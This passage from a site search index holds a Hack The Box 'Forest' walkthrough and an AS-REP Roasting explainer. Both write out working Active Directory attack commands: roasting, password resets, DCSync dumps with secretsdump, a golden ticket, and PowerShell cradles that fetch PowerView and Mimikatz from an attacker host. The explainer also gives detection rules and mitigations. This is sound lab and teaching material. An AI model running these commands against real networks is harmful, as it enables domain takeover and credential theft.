null sessions can lead to a foothold: netexec smb $box -u 'guest' -p '' --shares netexec smb $box -u '' -p '' --shares Neither work we can see that Guest is disabled and NULL sessions are disabled. +Note+: We can see the build number is 14393 so we can search for known exploits. I check \u0026amp; it says M17-07 but this is not valid on this box. Trying Usernames as Passwords: I always try usernames as passwords as well: netexec smb $box -u Users.txt -p Users.txt --shares --continue-on-success | grep [+] No dice, no users have used their username as passwords. DNS 53: Using dnsenum to enumerate DNS entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain Standard entries for a DC. LDAP 389: Using LDAP anonymous bind to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.\nWe can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapire https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb python3 /home/kali/windowsTools/enumeration/ldapire.py $box It will dump general information \u0026amp; also detailed \u0026amp; simple information including: Groups Computers Users All domain objects A file containing all description fields It will also search the domain for any service/svc accounts and place them in a folder too. We have the naming context of the domain: kali in HTB/BlogEntriesMade/Forest/scans/ldap 🍣 main 📝 ×143🗃️ ×3🛤️ ×113 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 08:32:01 zsh ❯ python3 /home/kali/windowsTools/enumeration/ldapire/ldapire.py $box ------------------------------------------------------------ Server Information ------------------------------------------------------------ • IP Address : 10.129.95.210 • Domain Name : htb.local • Server Name : FOREST • Forest Level: 7 • Domain Level: 7 It turns out the anonymous bind is enabled and we get the below information.\n------------------------------------------------------------ Connection Attempts ------------------------------------------------------------ • Attempting SSL connection... ✗ Failed to connect with SSL • Attempting non-SSL connection... ✓ Connected successfully using anonymous bind ------------------------------------------------------------ Security Warning ------------------------------------------------------------ ⚠️ WARNING: Connected using Anonymous Bind ⚠️ This is a security risk and should be disabled We have the domain functionality level:\n• Forest Level: 7 • Domain Level: 7 The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere’s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name \u0026amp; domain name:\n------------------------------------------------------------ Server Information ------------------------------------------------------------ • IP Address : 10.129.95.210 • Domain Name : htb.local • Server Name : FOREST It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. The script also has created several files with various amounts on information lets examine those.\n------------------------------------------------------------ Processing Users ------------------------------------------------------------ [+] Detailed results written to UsersDetailed.txt [+] Basic names written to Users.txt ✓ Basic user names → Users.txt ✓ Detailed user info → UsersDetailed.txt ------------------------------------------------------------ Processing Groups ------------------------------------------------------------ [+] Groups written to GroupsDetailed.txt [+] Basic names written to Groups.txt ✓ Basic group names → Groups.txt ✓ Detailed group info → GroupsDetailed.txt ------------------------------------------------------------ Processing Computers ------------------------------------------------------------ [+] Computers written to ComputersDetailed.txt [+] Basic names written to Computers.txt ✓ Basic computer names → Computers.txt ✓ Detailed computer info → ComputersDetailed.txt ------------------------------------------------------------ Processing All Objects ------------------------------------------------------------ [+] Detailed results written to ObjectsDetailedLdap.txt [+] Basic names written to Objects.txt ✓ Basic object names → Objects.txt ✓ Detailed object info → ObjectsDetailedLdap.txt ------------------------------------------------------------ Processing Descriptions ------------------------------------------------------------ [+] All descriptions written to AllObjectDescriptions.txt ✓ All object descriptions → AllObjectDescriptions.txt It will also check for any service accounts and write them to a file:\n----------------------------------------------------------- Searching for Service Accounts ------------------------------------------------------------ 🔍 Searching Users.txt - No matches in Users.txt 🔍 Searching UsersDetailed.txt ✓ Found matches in UsersDetailed.txt 🔍 Searching Groups.txt ✓ Found matches in Groups.txt 🔍 Searching GroupsDetailed.txt ✓ Found matches in GroupsDetailed.txt 🔍 Searching Objects.txt ✓ Found matches in Objects.txt 🔍 Searching ObjectsDetailedLdap.txt ✓ Found matches in ObjectsDetailedLdap.txt 🔍 Searching AllObjectDescriptions.txt ✓ Found matches in AllObjectDescriptions.txt ✓ Service account findings written to ServiceAccounts.txt ✓ Found 646 potential matches Updating ETC/HOSTS \u0026amp; Variables: Updated Domain \u0026amp; Machine Variables for Testing:\nNow that I have this information, I can update the domain and machine variables used in tests: update_var domain \u0026quot;htb.local\u0026quot; update_var machine \u0026quot;forest\u0026quot; Updating /etc/hosts for DNS and LDAP Queries:\nI update my /etc/hosts file to enable tools like kerbrute for user enumeration and other tools that require DNS or LDAP for queries: echo \u0026quot;$box $domain $machine.$domain\u0026quot; | sudo tee -a /etc/hosts Syncing Clocks for Kerberos Exploitation: Since Kerberos is enabled on this host, it\u0026rsquo;s best practice to sync our clock with the host’s. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts. sudo ntpdate -s $domain +Note+: I am doing this now as we have the DNS name etc. Searching the descriptions file for any passwords: I search for the string pass in the description field file but only pull up standard RODC group entries: Checking the users file: As the tool extracts valid usernames I now have a good usernames list I can use for password spraying etc: Finding a service account svc-alfresco in our LDAP Results: As my tool extracts service accounts from all the files, it finds a service account called* svc-alfresco in the Objects file: By running a simple search for svc I find the account. This is interesting as it also shows that the account is in a dedicated OU called \u0026ldquo;Service Accounts.\u0026rdquo; Manually Finding the svc-alfresco service account: First we would need to extract all OU\u0026rsquo;s to get the name of the OU to query manually:\nldapsearch -x -H ldap://$domain -b \u0026quot;dc=htb,dc=local\u0026quot; \u0026quot;(objectClass=organizationalUnit)\u0026quot; sAMAccountName As we can see it find the OU. Then we need to query for all objects within the OU \u0026quot;Service Accounts\u0026quot;:\nldapsearch -x -H ldap://$domain -b \u0026quot;ou=Service Accounts,dc=htb,dc=local\u0026quot; \u0026quot;(objectClass=*)\u0026quot; sAMAccountName We can then eventually see the service account listed. Service Accounts in AD: In many Active Directory (AD) environments, service accounts are often placed in a dedicated Organizational Unit (OU) to simplify management and apply specific policies or permissions. However, this varies widely based on organizational practices and security policies. Common Practices for Service Account OUs: Dedicated \u0026ldquo;Service Accounts\u0026rdquo; OU: Many organizations create a specific OU for service accounts (e.g., OU=Service Accounts,DC=domain,DC=com) to make it easier to manage these accounts and apply Group Policies (GPOs). Separation by Department or Function: Some environments organize service accounts by department (e.g., OU=IT Service Accounts) or function. Default Users OU: In less mature AD setups, service accounts may reside in the default Users container or other existing OUs without specific segregation. Benefits of Using a Dedicated Service Account OU: Centralized Management: Easier to apply specific permissions, delegate access control, or manage policies for service accounts collectively. Enhanced Security: Ensures that Group Policies can restrict privileges or enforce stricter password and lockout policies on service accounts, reducing attack surfaces. Kerberos 88: AS-REP Roasting svc-alfresco to retrieve their hash with impacket-GetNPUsers: As we have a users file we can attempt to asreproast the users: impacket-GetNPUsers $domain/ -dc-ip $box -usersfile Users.txt -format hashcat -outputfile asRepHashes.txt -no-pass We get a hit for \u0026ldquo;svc-alfresco\u0026rdquo;! +Note+: we could have also done impacket-GetNPUsers $domain/ -request and it will also find the account, however as I had the name of the account I was able to add it to my list of usernames and target them. What is svc-alfresco account for: A quick search leads me to this page: https://docs.alfresco.com/identity-service/latest/tutorial/sso/kerberos/ We can see that they recommend that when setting up the service account that the \u0026ldquo;Do not require Kerberos pre-authentication.\u0026rdquo; is enabled. So this is for this service to be able to authenticate back with the Domain Controller for authentication. But bloodstiller what does \u0026ldquo;Do not require Kerberos pre-authentication.\u0026rdquo; mean…glad you asked. AS-REP Roasting Primer: ASREPRoasting is an attack against Kerberos authentication where an attacker requests an AS-REP (Authentication Service Response) for user accounts that have the \u0026quot;Do not require Kerberos preauthentication\u0026quot; setting enabled (like the svc-alfresco account). We can then attempt to crack the encrypted TGT (Ticket-Granting Ticket) offline to obtain plaintext credentials for the account. The DONT_REQ_PREAUTH flag can sometimes be required for service accounts for compatibility (as we can see above.) ASREPRoasting is similar to Kerberoasting but targets AS-REP instead of TGS-REP (Ticket-Granting Service Response) +Detailed Deep Dive+: I have a deep dive on AS-REP Roasting. https://bloodstiller.com/articles/understandingasreproasting/ 2. Foothold: Cracking svc-alfresco\u0026rsquo;s hash with hashcat: I run hashcat to crack the hash:\nhashcat -m 18200 asRepHashes.txt ~/Wordlists/rockyou.txt It cracks I verify the creds are valid:\nnetexec smb $box -u $user -p $pass --shares They are Grabbing our user flag:\nI login with evil-winrm and grab the user flag: Performing a bloodhound collection as svc-alfresco: As we have creds the best thing to do is perform a bloodhound collection to look at valid attack paths:\nbloodhound-python -dc $machine.$domain -c All -u $user -p $pass -d $domain -ns $box After I import the data I check for any direct paths to the domain controller object and there is a clear attack path (or so it seems):\nWe have nested group membership of Account Operators which has GenericAll over the Enterprise Key Admins \u0026amp; Key Admins which both have the AddKeyCredentialLink privilege over the root domain object. This means we can make ourselves the group owner, give ourselves the privilege to add users, add ourselves to the group \u0026amp; then we inherit the AddKeyCredentialLink privilege. The AddKeyCredentialLink allows us to perform a shadow credentials attack on the host so this looks like a good attack path and it would be in the right environment. The reason this attack chain will not work is that the Domain Controller does not have Active Directory Certificate Services (AD-CS) running which means if we retrieved a certificate via a shadow credentials attack we could not authenticate against with it. Discovering we are part of the Privileged IT Accounts Group : My next attack path, appears to be a lateral to the user \u0026ldquo;Sebastien\u0026rdquo;.\nIf we access the host using evil-winrm we can see that \u0026ldquo;Sebastien\u0026rdquo; also has an account on the host. As we are Part of the \u0026ldquo;Privileged IT Accounts\u0026rdquo; group which has nested group membership of the \u0026ldquo;Account Operators\u0026rdquo; group we inherit the \u0026quot;GenericAll\u0026quot; permission over \u0026ldquo;Sebastien\u0026rdquo; \u0026amp; therefore can perform various attacks over him.\nPerforming A Targeted Kerberoasting Attack On Sebastien: The first attack I will try is a Targeted Kerberoasting attack. \u0026ldquo;How does this attack work?\u0026rdquo; I hear you ask, good thing I am here:\n+Requirements+: For us to be able to perform this attack we need one of the following privileges over the user:\nGenericAll GenericWrite WriteProperty Validated-SPN WriteProperties If we have one of the above privileges we can then do the following:\nAttach/generate an SPN for the user account. Request TGS for the user account (and save it.) As TGS is encrypted with NTLM password hash we can then crack and overtake user account. I download targetedkerberoast.py \u0026amp; perform the attack:\ngit clone https://github.com/ShutdownRepo/targetedKerberoast I add the SPN to \u0026ldquo;sebastien\u0026rdquo; and this is saved to the file sebastien.kerb\npython3 targetedKerberoast.py -v -d $domain -u $user -p $pass --request-user sebastien -o sebastien.kerb I then attempt to crack the hash, however I cannot crack it :(\nhashcat -m 13100 sebastien.kerb /home/kali/Wordlists/rockyou.txt -O I could try other rules but this box is rated as easy so if it\u0026rsquo;s not in rockyou.txt I doubt it will be intended to be cracked. Modifying \u0026ldquo;Sebastien\u0026rsquo;s\u0026rdquo; Password To Login As Him: As we cannot crack the hash so we will move onto changing passwords. As we have \u0026quot;GenericAll\u0026quot; privileges we can do what we want to his account.\nnewPass=bl00dst1ll3r! net rpc password \u0026quot;SEBASTIEN\u0026quot; $newPass -U $domain/$user%$pass -S $box +Note+: I do not like changing users passwords and see it as a last resort. There is no output from this so we need to verify it worked Verify it works \u0026ldquo;Sebastien\u0026rsquo;s\u0026rdquo; new creds work\nnetexec smb $box -u $user -p $newPass --shares Modifying \u0026ldquo;Sebastien\u0026rsquo;s\u0026rdquo; Group Memberships To Enable Us To Login: So we can login as \u0026ldquo;Sebastien\u0026rdquo; we will need to add him to the local group \u0026ldquo;Remote Management Users\u0026rdquo;\nBack in my \u0026ldquo;svc-alfresco\u0026rdquo; shell I add \u0026ldquo;Sebastien\u0026rdquo; to the \u0026ldquo;Remote Management Users\u0026rdquo; local group so he can login:\nnet localgroup \u0026quot;Remote Management Users\u0026quot; sebastien /add After some enumerating there appears to be nothing interesting \u0026ldquo;Sebastien\u0026rdquo; has access to on the host:\n3. Privilege Escalation: Finding Another Privilege Escalation Path In Bloodhound: Re-examining my bloodhound results the attack path seems very clear now. (woops) We have a straight shot to the root domain object from \u0026ldquo;svc-alfresco\u0026rdquo;\n\u0026ldquo;svc-alfresco\u0026rdquo; has inherited/nested membership to the Account Operators group \u0026amp; as the Account Operators group has GenericAll over EXCHANGE WINDOWS PERMISSIONS group, we in turn have GenericAll privileges over this group, much like we did with \u0026ldquo;sebastien\u0026rdquo;\nThis gives us a few different attack paths:\nThe first and easiest is adding a new user to the \u0026ldquo;Exchange Windows Permission\u0026rdquo; group and then granting them DCSync privileges over the root domain object to dump NTDS.dit. The second is in beyond root where we can dump it with svc-alfresco, however I was only able to perform this once. Intended Path To Root Adding A User \u0026amp; Granting Them DCSync Privileges: As we have GenericWrite over the group \u0026ldquo;EXCHANGE WINDOWS PERMISSIONS\u0026rdquo; we can add any users to the group \u0026amp; then in turn grant them DCSync privileges:\nAdd a user to the groups from svc-alfresco shell via evil-winrm:\nnet user bloodstiller bl00dst1ll3r! /add /domain Add to the user to the group \u0026ldquo;Exchane Windows Permissions\u0026rdquo;:\nnet group \u0026quot;Exchange Windows Permissions\u0026quot; bloodstiller /add Give the user remote management access by adding them to the group \u0026ldquo;Remote Management Users\u0026rdquo;:\nnet localgroup \u0026quot;Remote Management Users\u0026quot; bloodstiller /add This part is not necessary, however I want to use mimikatz so want remove access. To modify the ACL of the user we have created, we need to use PowerView:\nTo do this I will use a download cradle to load directly into memory for more information on download cradles see my +deep-dive+: https://bloodstiller.com/articles/understandingdownloadcradles/ Stand up python server: python -m http.server 9000 Load into memory: iex(new-object net.webclient).downloadstring('http://10.10.14.99:9000/PowerView.ps1') As we are still logged in as svc-alfresco, we need to use a Credentialed Object to grant our user DCSync Privileges:\n$SecPassword = ConvertTo-SecureString \u0026#39;bl00dst1ll3r!\u0026#39; -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential(\u0026#39;htb\\bloodstiller\u0026#39;, $SecPassword) Grant ours user DCSync privileges with PowerView:\nAdd-DomainObjectAcl -Credential $Cred -TargetIdentity \u0026quot;DC=htb,DC=local\u0026quot; -PrincipalIdentity bloodstiller -Rights DCSync We can now use secrets-dump to dump the NTDS.dit.\nimpacket-secretsdump $domain/$user:$pass@$box We can now login as the administrator using their hash and get the flag:\nevil-winrm -i $box -u $user -H $hash Granting svc-alfresco DCSync Rights (unintended path to root): +Note+: I have since tried to recreate this attack path with chaining the commands quickly and it will not work for me, maybe I got lucky on first try.\nAttack Path: Make \u0026ldquo;svc-alfresco\u0026rdquo; owner of the group \u0026ldquo;Exchange Windows Permissions\u0026rdquo; Grant \u0026ldquo;svc-alfresco\u0026rdquo; the ability to add users to the group \u0026ldquo;Exchange Windows Permissions\u0026rdquo; by modifying the DACL. Add \u0026ldquo;svc-alfresco\u0026rdquo; to the group to group \u0026ldquo;Exchange Windows Permissions\u0026rdquo;. Grant \u0026ldquo;svc-alfresco\u0026rdquo; DCSync privileges over the root domain object by modifying the DACL using our new inherited WriteDacl permission we now have by being part of the \u0026ldquo;Exhange Windows Permissions\u0026rdquo; group. Make \u0026ldquo;svc-alfresco\u0026rdquo; the new owner of Exchange Windows Permissions group:\nimpacket-owneredit -action write -new-owner $user -target-sid 'S-1-5-21-3072663084-364016917-1341370565-1121' $domain/$user:$pass +Note+: I extract the SID for this group from bloodhound, or we can use impacket-lookupsid Grant \u0026ldquo;svc-alfresco\u0026rdquo; the ability to add users to the group by modifying the DACL\u0026rsquo;s:\nimpacket-dacledit -action 'write' -rights 'WriteMembers' -principal $user -target-sid 'S-1-5-21-3072663084-364016917-1341370565-1121' $domain/$user:$pass Add \u0026ldquo;svc-alfresco\u0026rdquo; to the group:\nnet rpc group addmem \u0026quot;EXCHANGE WINDOWS PERMISSIONS\u0026quot; $user -U $domain/$user%$pass -S $box +Note+: There will be no output from this command, we need to instead verify it worked in the next command. Verify \u0026ldquo;svc-alfresco\u0026rdquo; is now part of the group*:\nnet rpc group members \u0026quot;EXCHANGE WINDOWS PERMISSIONS\u0026quot; -U $domain/$user%$pass -S $box Grant \u0026ldquo;svc-alfresco\u0026rdquo; DCSync privileges:\nimpacket-dacledit -action 'write' -rights 'DCSync' -principal $user -target-dn 'DC=HTB,DC=LOCAL' $domain/$user:$pass It does not work due to insufficient rights, which I know to be incorrect as we have granted them. I check our group membership \u0026amp; can see we have been removed from the group \u0026ldquo;Exchange Windows Permissions\u0026rdquo;:\nnet rpc group members \u0026quot;EXCHANGE WINDOWS PERMISSIONS\u0026quot; -U $domain/$user%$pass -S $box I suspect this will be due to a scheduled task that will run and ensure that the only user in the group is \u0026ldquo;Exchange Trusted Subsystem\u0026rdquo;. Luckily we have seen ourselves in the group so in theory all we have to do is re-add ourselves, grant ourselves DCSync privileges and then perform a DCSync attack in quick succession. We will run the below 2 commands, in quick succession to perform the final part of the attack:\nnet rpc group addmem \u0026quot;EXCHANGE WINDOWS PERMISSIONS\u0026quot; $user -U $domain/$user%$pass -S $box impacket-dacledit -action 'write' -rights 'DCSync' -principal $user -target-dn 'DC=HTB,DC=LOCAL' $domain/$user:$pass We can then quickly dump the NDST.dit database by using impacket-secrets dump:\nimpacket-secretsdump $domain/$user:$pass@$machine.$domain 4. Persistence: Creating a Kerberos Golden Ticket: We already have the KRBTGT hash via secretsdump however I wanted to show an alternate option with using invoke-mimikatz in a download cradle for a targeted extraction of just the KRBTGT aes hash.\nLogin as the user we have added:\nevil-winrm -i $box -u $user -p $newPass We can login as our new user or with admin, as long as we have administrator rights. Load mimikatz into memory via download cradle:\niex(new-object net.webclient).downloadstring('http://10.10.14.99:9000/Invoke-Mimikatz.ps1') Perform a targeted DCSync attack to extract the KRBTGT hash.\nInvoke-Mimikatz -Command '\u0026quot;privilege::debug\u0026quot; \u0026quot;lsadump::dcsync /user:krbtgt /domain:htb.local\u0026quot;' It spits out errors but we still manage to get the hashes. Sync our host clock to the host using ntpdate:\nsudo ntpdate -s $domain Using impacket-ticketer to create the Golden Ticket:\nimpacket-ticketer -aesKey $krbtgt -domain-sid $sid -domain $domain Administrator Export the ticket to the KRB5CCNAME Variable:\nexport KRB5CCNAME=./Administrator.ccache Use the ticket for connecting via psexec\nimpacket-psexec -k -no-pass $machine.$domain Why create a golden ticket? \u0026ldquo;But bloodstiller why are you making a golden ticket if you have the admin hash?\u0026rdquo; Glad you asked: Creating a Golden Ticket during an engagement is a reliable way to maintain access over the long haul. Here’s why: KRBTGT Hash Dependence: Golden Tickets are generated using the KRBTGT account hash from the target’s domain controller. Unlike user account passwords, KRBTGT hashes are rarely rotated (and in many organizations, they are never changed), so the Golden Ticket remains valid indefinitely. KRBTGT Hash—The Key to It All (for upto 10 years): A Golden Ticket can allow you to maintain access to a system for up to 10 years (yeah, you read that right the default lifespan of a golden ticket is 10 years) without needing additional credentials. This makes it a reliable backdoor, especially if re-access is needed long after initial entry. Think about it: even if they reset every user’s password (including the administrator etc) your Golden Ticket is still valid because it’s tied to the KRBTGT account, not individual users. Lessons Learned: What did I learn? I learned that even though I got a random bypass for a secondary route to root that I cannot recreate it no matter how hard I try (1 full day) I decided to actually put all of my ASREP-Roasting knowledge in an article so that hopefully cemeneted that further: https://bloodstiller.com/articles/understandingasreproasting/ What silly mistakes did I make? Had some real slow moments when I had multiple evil-winrm sessions open and was wondering why mimikatz would not work, because I was running it from a user without DCSync privs….. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/forest-box\/"
    },
    
    "http:\/\/localhost:1313\/tags\/genericall\/": {
        "title": "GenericAll",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/genericall\/"
    },
    
    "http:\/\/localhost:1313\/tags\/genericwrite\/": {
        "title": "GenericWrite",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/genericwrite\/"
    },
    
    "http:\/\/localhost:1313\/tags\/mimikatz\/": {
        "title": "Mimikatz",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/mimikatz\/"
    },
    
    "http:\/\/localhost:1313\/articles\/understandingasreproasting\/": {
        "title": "Understanding AS-REP Roasting Attacks: A Deep Dive",
        "tags": ["Windows","Active Directory","ASREPRoasting","Kerberos",],
        "content": "Understanding AS-REP Roasting: General Overview and Attack Flow: ASREPRoasting is an attack against Kerberos authentication where an attacker requests an AS-REP (Authentication Service Response) for user accounts that have the \u0026quot;Do not require Kerberos preauthentication\u0026quot; setting enabled The attacker can then attempt to crack the encrypted TGT (Ticket-Granting Ticket) offline to obtain plaintext credentials ASREPRoasting is similar to Kerberoasting but targets AS-REP instead of TGS-REP (Ticket-Granting Service Response) Attack Process Attacker enumerates users with the \u0026ldquo;Do not require Kerberos preauthentication\u0026rdquo; setting Some vendor installation guides require service accounts with DONT_REQ_PREAUTH disabled, making these accounts vulnerable These accounts are less frequently used than Service Principal Names (SPNs), which are more commonly targeted in Kerberoasting attacks Requests an AS-REP from the Key Distribution Center (KDC) Cracks the encrypted TGT offline to retrieve plaintext credentials Attack Flow Diagram [Attacker] [Domain Controller/KDC] [Target User] | | | | 1. AS-REQ | | | (without Pre-Authentication) | | |-------------------------------------→ | | | | | | | 2. Checks if DONT_REQ_PREAUTH | | | is set for requested user | | | | | 3. AS-REP | | | (contains encrypted TGT) | | | ←-------------------------------------| | | | | | 4. Offline Password | | | Cracking Attempt | | | | | | | | [Success = Compromised Credentials] | | +Key Points+:\nNo interaction with target user required No failed login attempts generated Encryption uses user\u0026rsquo;s password hash Can be performed without domain credentials +For example+: we can run impacket-GetNPUsers without any authentication and retrieve the TGT. impacket-GetNPUsers $domain/ -request (more on tools later) Pre-Authentication Process: Normal Pre-Authentication:\nEncryption key for AS-REQ (Authentication Server Request) is a timestamp encrypted with the user\u0026rsquo;s password hash If the AS-REP timestamp is within a few minutes of the KDC\u0026rsquo;s time, the KDC will issue the TGT via AS-REP [Client] [KDC] | | | 1. AS-REQ | | (Encrypted Timestamp) | |--------------------------------\u0026gt;| | | | 2. Decrypt \u0026amp; Verify | | Timestamp | | | | 3. AS-REP | | (TGT if timestamp valid) | |\u0026lt;--------------------------------| | | Without Pre-Authentication (how ASREPRoasting works): Attacker sends a fake AS-REQ The KDC sends a TGT immediately, no password needed The AS-REP includes the TGT and additional encrypted data This data can be cracked offline to obtain the user\u0026rsquo;s key (password hash) [Attacker] [KDC] | | | 1. AS-REQ | | (No Pre-Auth Required) | |--------------------------------\u0026gt;| | | | 2. No Verification | | Needed | | | | 3. AS-REP | | (Encrypted TGT + Data) | |\u0026lt;--------------------------------| | | | 4. Offline Cracking | | Begins | | | Detection and Defense: Detection Methods Monitor Active Directory logs for unusual AS-REP requests, particularly those without preauthentication: Event ID = 4768 and 4625 Ticket Encryption Type = 0x17. Ticket Options = 0x5080000. Service Name = krbtgt Regularly scan user accounts for the DONT_REQ_PREAUTH attribute SIEM Detection Rules: Splunk: index=windows EventCode=4768 AND Preauthentication_Type=\u0026quot;0x0\u0026quot; Microsoft Sentinel: SecurityEvent | where EventID == 4768 | where PreAuthType == \u0026quot;0\u0026quot; Elastic: event.code:4768 AND winlog.event_data.PreAuthType:0 PowerShell: Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth Mitigation Strategies: Disable the \u0026ldquo;Do not require Kerberos preauthentication\u0026rdquo; setting unless absolutely necessary Enforce strong password policies to reduce the risk of password cracking Use multifactor authentication (MFA) for accounts with elevated privileges Regularly review and audit account settings in Active Directory Defense in Depth Strategies: Network Segmentation: Implement network zones to limit access to the Domain Controller. Use PAWs (Privileged Access Workstations ) for administrative tasks. Deploy honeypot accounts with DONT_REQ_PREAUTH to detect attempts. Monitoring and Alerting: Set up automated scripts to monitor for DONT_REQ_PREAUTH changes. Create alerts for sudden increases in AS-REQ traffic. Monitor for known AS-REP Roasting tool signatures. Active Directory Hardening: Regular security assessments focusing on Kerberos configurations. Implement LAPS for local admin password management. This way if tickets are extracted they cannot be cracked. Use tiered administration model to limit attack surface. Common Misconfigurations in AD Environments that can lead to AS-REP Roasting: All of the below should be looked out for in your environments.\nDefault service account configurations in specific applications: Exchange Server service accounts SQL Server service accounts Legacy application service accounts Legacy systems requiring Kerberos compatibility Misconfigured trust relationships between domains Improperly migrated user accounts from older AD versions Third-party applications requiring DONT_REQ_PREAUTH for compatibility AS-REP-Roasting Enumeration Tools: +Note+: In all of the below enumeration \u0026amp; attack screenshots the user \u0026ldquo;svc-alfresco\u0026rdquo; is susceptible to AS-REP Roasting. Using PowerView to Enumerate users susceptible to AS-REP Roasting: Get-DomainUser -KerberosPreauthNotRequired -Properties samaccountname,useraccountcontrol,memberof Using PowerShell to Enumerate users susceptible to AS-REP Roasting: Vanilla Powershell: (New-Object DirectoryServices.DirectorySearcher \u0026#34;(\u0026amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\u0026#34;).FindAll() | ForEach-Object { $_.Properties | Select-Object @{n=\u0026#39;sAMAccountName\u0026#39;;e={$_[\u0026#39;sAMAccountName\u0026#39;][0]}}, @{n=\u0026#39;displayName\u0026#39;;e={$_[\u0026#39;displayName\u0026#39;][0]}} } Using PowerShell \u0026amp; AD Module to Enumerate users susceptible to AS-REP Roasting: Powershell Active Directory Powershell Module: # Shows all details for User Account Get-ADUser -Filter {DoesNotRequirePreAuth -eq \u0026#39;True\u0026#39;} | fl # Provides just the name Get-ADUser -filter {DoesNotRequirePreAuth -eq \u0026#39;True\u0026#39;} | select name Using Powershell AD Module \u0026amp; an LDAP filter:\nGet-ADObject -LdapFilter \u0026#34;(\u0026amp;(\u0026amp;(\u0026amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))))\u0026#34; AS-REP Roasting +Attack+ Tools: Using Impacket-GetNPUsers for AS-REP Roasting Attack: # General command to find AS-REP roastable accounts impacket-GetNPUsers $domain/ -request -format hashcat -outputfile hashes.txt # With a specified users file and domain controller IP GetNPUsers.py [DOMAIN]/ -dc-ip [DC_IP] -usersfile [UserFile] -format hashcat -outputfile hashes.txt -no-pass # Example usage GetNPUsers.py SUGARAPE/ -dc-ip 10.129.205.35 -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/hashes.txt -no-pass Using Rubeus for AS-REP Roasting Attack: Has an ASREPRoast: module for Windows-based attacks: # Standard Rubeus Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt # If running via download cradle from PowerSharpPack PowerSharpPack -rubeus -Command \u0026#34;asreproast /format:hashcat /outfile:hashes.txt\u0026#34; Using Netexec for AS-REP Roasting Attack: In my experience this always needs a list of supplied users to attempt to asreproast with.\nnetexec ldap $machine.$domain -u Users.txt -p \u0026#39;\u0026#39; --asreproast asRepTickets.txt Targeted AS-REPRoasting Attack: If an attacker has GenericWrite or GenericAll permissions over an account, they can enable this attribute, request the AS-REP for offline cracking, then disable it again The success of this attack depends on the user having a weak password Cracking AS-Rep Tickets Using Hashcat:\nMode 18200 for cracking AS-REP hashes Command: hashcat -m 18200 asRepTickets.txt wordlist.txt -r rules/best64.rule Using John:\njohn --wordlist=~/Wordlist asRepTickets.txt Tool Comparison Matrix Tool Windows/Linux Auth Required Stealth Level Rubeus Windows Yes Medium Impacket Linux No High PowerView Windows Yes Low NetExec Both (User list) Medium Comparison with Other Attack Techniques: AS-REP Roasting vs Kerberoasting: Lower detection rate due to fewer logging mechanisms Smaller attack surface (fewer vulnerable accounts) Often overlooked in security audits No need for service account enumeration AS-REP Roasting vs Password Spraying: More stealthy as it doesn\u0026rsquo;t generate failed login attempts Can be performed without valid domain credentials Offline cracking reduces detection risk Targeted approach vs broad-spectrum attack Practice AS-REP Roasting on Hack The Box The following machines are good for practice AS-REP Roasting:\nhttps://app.hackthebox.com/machines/Forest +My Walkthrough+: https://bloodstiller.com/walkthroughs/forest-box/ https://app.hackthebox.com/prolabs/overview/Sauna +My Walkthrough+: https://bloodstiller.com/walkthroughs/sauna-box/ https://app.hackthebox.com/prolabs/overview/dante This is a prolab and AS-REP Roasting is one of many attack/privesc chains. ", 
        "url": "http:\/\/localhost:1313\/articles\/understandingasreproasting\/"
    },
    
    "http:\/\/localhost:1313\/tools\/ldapire\/": {
        "title": "LDAPire: LDAP Enumeration Tool",
        "tags": ["Active Directory","Windows","LDAP","Python","Tools",],
